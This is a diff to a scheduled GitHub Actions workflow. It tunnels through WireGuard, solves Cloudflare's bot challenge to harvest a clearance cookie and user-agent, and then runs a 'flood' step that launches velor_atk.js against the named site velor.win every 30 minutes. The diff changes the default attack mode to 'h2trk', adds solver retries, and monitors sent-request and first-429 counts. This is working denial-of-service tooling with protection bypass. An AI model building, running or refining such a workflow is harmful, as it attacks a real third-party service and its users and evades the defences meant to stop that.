@@ -7,7 +7,7 @@ on:
       workers:
         default: '4'
       mode:
-        default: 'track500'
+        default: 'h2trk'
   schedule:
     - cron: '*/30 * * * *'
 jobs:
@@ -46,6 +46,7 @@ jobs:
           PersistentKeepalive = 25
           EOF
           sudo wg-quick up bt
+          echo "$ADDR" > /tmp/addr.txt
           echo "ADDR=$ADDR" >> $GITHUB_ENV
           echo "egress: $(curl -s6 --max-time 8 https://www.cloudflare.com/cdn-cgi/trace | grep -E '^ip=' || echo none)"
           echo "velor-pre: $(curl -s6 -o /dev/null -w "%{http_code}" --max-time 8 https://velor.win/api/health)"
@@ -54,23 +55,35 @@ jobs:
           LOCAL_IP: ${{ env.ADDR }}
         run: |
           mkdir -p ck && cd ck
-          SOLVE_FAM=v6 SOLVE_PORT=9333 timeout 170 xvfb-run -a node ../solve.js || true
-          CK=$(cat cf_cookie.txt 2>/dev/null); UA=$(cat cf_ua.txt 2>/dev/null)
+          for a in 1 2; do
+            [ -s cf_cookie.txt ] && break
+            SOLVE_FAM=v6 SOLVE_PORT=9333 timeout 150 xvfb-run -a node ../solve.js || true
+            sleep 3
+          done
+          CK=$(cat cf_cookie.txt 2>/dev/null || true); UA=$(cat cf_ua.txt 2>/dev/null || true)
           echo "cklen=${#CK}"
-          chk=$(curl -6 --interface $LOCAL_IP -o /dev/null -w "%{http_code}" -A "$UA" -b "$CK" --max-time 8 https://velor.win/api/health)
+          chk=$(curl -6 --interface $LOCAL_IP -o /dev/null -w "%{http_code}" -A "$UA" -b "$CK" --max-time 8 https://velor.win/api/health || true)
           echo "cookie-check=$chk"
           echo "CF_COOKIE=$CK" >> $GITHUB_ENV
           echo "CF_UA=$UA" >> $GITHUB_ENV
       - name: flood
         env:
           TARGET_HOST: velor.win
-          LOCAL_IP: ${{ env.ADDR }}
-          CF_COOKIE: ${{ env.CF_COOKIE }}
-          CF_UA: ${{ env.CF_UA }}
           PACE_MS: '600'
           ATK_OUT: atk.out
         run: |
+          ADDR=$(cat /tmp/addr.txt 2>/dev/null || true); [ -z "$ADDR" ] && ADDR="${{ env.ADDR }}"
+          CK=$(cat ck/cf_cookie.txt 2>/dev/null || true); UA=$(cat ck/cf_ua.txt 2>/dev/null || true)
+          echo "envcheck: cklen=${#CK} ualen=${#UA} addr=$ADDR"
+          export CF_COOKIE="$CK" CF_UA="$UA" LOCAL_IP="$ADDR"
+          node -e '
+          const https=require("https");
+          https.get({host:"velor.win",path:"/api/health",localAddress:process.env.LOCAL_IP,family:6,headers:{cookie:process.env.CF_COOKIE,"user-agent":process.env.CF_UA}},s=>{let b="";s.on("data",c=>b+=c);s.on("end",()=>{const t=(b.match(/<title>([^<]*)/)||[])[1]||"";console.log("NODE-PROBE code="+s.statusCode+" "+t);});}).on("error",e=>console.log("NODE-PROBE err="+e.message));
+          '
           T=$(( ${{ inputs.seconds || '1200' }} + 60 ))
-          echo "flood mode=${{ inputs.mode || 'track500' }} from $LOCAL_IP cap=${T}s"
-          timeout $T node velor_atk.js ${{ inputs.mode || 'track500' }} ${{ inputs.workers || '4' }} ${{ inputs.seconds || '1200' }} 2>&1 | tail -8 || true
-          echo "== tail =="; tail -4 atk.out 2>/dev/null || true
+          echo "flood mode=${{ inputs.mode || 'h2trk' }} from $LOCAL_IP cap=${T}s"
+          node velor_atk.js ${{ inputs.mode || 'h2trk' }} ${{ inputs.workers || '4' }} ${{ inputs.seconds || '1200' }} > live.log 2>&1 &
+          HP=$!
+          while kill -0 $HP 2>/dev/null && [ $SECONDS -lt $T ]; do sleep 20; tail -1 atk.out 2>/dev/null || true; done
+          wait $HP 2>/dev/null || true
+          echo "== final codes =="; grep -E 'sent=|first429' atk.out 2>/dev/null | tail -3; tail -2 atk.out 2>/dev/null
